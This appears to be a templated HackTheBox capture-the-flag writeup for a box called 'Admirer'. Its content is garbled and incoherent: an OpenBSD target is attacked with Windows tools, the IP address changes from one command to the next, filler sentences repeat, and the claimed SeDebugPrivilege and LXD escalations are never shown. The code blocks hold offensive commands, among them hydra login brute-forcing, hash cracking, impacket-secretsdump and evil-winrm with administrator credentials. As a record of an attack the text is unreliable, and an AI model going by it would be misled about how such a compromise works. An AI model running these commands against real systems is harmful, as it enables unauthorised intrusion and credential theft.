---
TitleSEO: "HackTheBox — Admirer (Insane OpenBSD) | ZureFX"
TitlePost: "HackTheBox — Admirer (Insane OpenBSD)"
Author: "ZureFX"
Description: "Full writeup for HackTheBox Admirer. SeDebugPrivilege and LXD Privilege Escalation to achieve insane compromise on OpenBSD."
Keywords: "hard, pwntilldawn, hackthebox, forensics, easy, windows"
URL: "https://zurefx.github.io/writeups/htb-admirer-911.html"
URL_IMAGES: "https://raw.githubusercontent.com/zurefx/images/refs/heads/main/writeups/htb-admirer-911/"
Date: "2025-09-13"
Tags: "Hard, PwnTillDawn, HackTheBox, Forensics, Easy, Windows"
Section: "writeups"
Lang: "en"
main_img: "htb-admirer-911"
Permalink: "/writeups/htb-admirer-911.html"
BtnLabel: "Read Writeup"
Pick: 0
---
## Machine Info

### Overview

The target **Admirer** is rated **Insane** on HackTheBox. It runs **OpenBSD** and the IP address during this analysis was `10.120.111.211`.

### Objectives

The backup files contained sensitive information that should not have been accessible. The service was running without proper input validation, leading to injection vulnerabilities.

## Enumeration

### Port Scanning

Starting with a full port scan to identify the attack surface.

```bash
nmap -sCV -p636,1521,3268 10.61.232.89 -oN scan.txt
crackmapexec smb 10.118.78.139 -u administrator -p 'P@ssw0rd!' --shares
nmap -sCV -p5985,25,8443 10.121.111.245 -oN scan.txt
```

Lateral movement was facilitated by reusing discovered credentials across services. Lateral movement was facilitated by reusing discovered credentials across services.

### Service Enumeration

The backup files contained sensitive information that should not have been accessible. The scheduled task ran with elevated privileges and could be abused for escalation. Privilege escalation was possible due to misconfigured sudo permissions.

```bash
nmap -sCV -p110,27017,5986 10.10.187.44 -oN scan.txt
```

The application stored sensitive credentials in an unencrypted configuration file. The scheduled task ran with elevated privileges and could be abused for escalation.

### SMB Enumeration

Weak file permissions allowed modification of critical system files. Authentication bypass was achieved through careful manipulation of the login mechanism.

```bash
john --wordlist=/usr/share/wordlists/rockyou.txt hash.txt
hydra -l admin -P /usr/share/wordlists/rockyou.txt 10.47.167.166 http-post-form '/login:user=^USER^&pass=^PASS^:Invalid'
hashcat -m 1000 hashes.txt /usr/share/wordlists/rockyou.txt --force
```

The service was running without proper input validation, leading to injection vulnerabilities. Group Policy Preferences contained encrypted but recoverable credentials. The kernel version was outdated and vulnerable to a publicly known exploit.

## Exploitation

### Vulnerability Identification

Post-exploitation enumeration revealed a path to domain administrator privileges. The scheduled task ran with elevated privileges and could be abused for escalation. Lateral movement was facilitated by reusing discovered credentials across services.

Key finding: **SeDebugPrivilege**.

Weak file permissions allowed modification of critical system files. Network traffic analysis revealed unencrypted communications containing user credentials.

### Initial Access

The scheduled task ran with elevated privileges and could be abused for escalation. Initial enumeration revealed several interesting open ports on the target.

```bash
gobuster dir -u http://10.105.68.48/ -w /usr/share/wordlists/dirb/common.txt -x php,txt,html
hashcat -m 1000 hashes.txt /usr/share/wordlists/rockyou.txt --force
hashcat -m 1000 hashes.txt /usr/share/wordlists/rockyou.txt --force
nmap -sCV -p445,389,8888 10.98.53.132 -oN scan.txt
```

Lateral movement was facilitated by reusing discovered credentials across services. The application stored sensitive credentials in an unencrypted configuration file. Group Policy Preferences contained encrypted but recoverable credentials.

## Privilege Escalation

### Enumeration

The service was running without proper input validation, leading to injection vulnerabilities. Token impersonation allowed elevation to SYSTEM privileges on the target. Post-exploitation enumeration revealed a path to domain administrator privileges.

```powershell
hashcat -m 1000 hashes.txt /usr/share/wordlists/rockyou.txt --force
john --wordlist=/usr/share/wordlists/rockyou.txt hash.txt
john --wordlist=/usr/share/wordlists/rockyou.txt hash.txt
impacket-secretsdump administrator:'P@ssw0rd!'@10.67.202.111
```

### Exploitation

The service account had excessive permissions assigned in Active Directory. The kernel version was outdated and vulnerable to a publicly known exploit.

```powershell
evil-winrm -i 10.86.208.113 -u administrator -p 'P@ssw0rd!'
john --wordlist=/usr/share/wordlists/rockyou.txt hash.txt
nmap -sCV -p3268,3389,8443 10.116.195.178 -oN scan.txt
```

The target system was identified as running a vulnerable version of the service. The web application was vulnerable to Server-Side Template Injection (SSTI).

### Root/SYSTEM

Successfully obtained **SYSTEM** access on the target.

Network traffic analysis revealed unencrypted communications containing user credentials. The service account had excessive permissions assigned in Active Directory.

## Summary

### Tools Used

- `pwncat`
- `rpcclient`
- `impacket`
- `atexec`
- `dcomexec`
- `crackmapexec`
- `netcat`

### Key Takeaways

- SeDebugPrivilege
- LXD Privilege Escalation
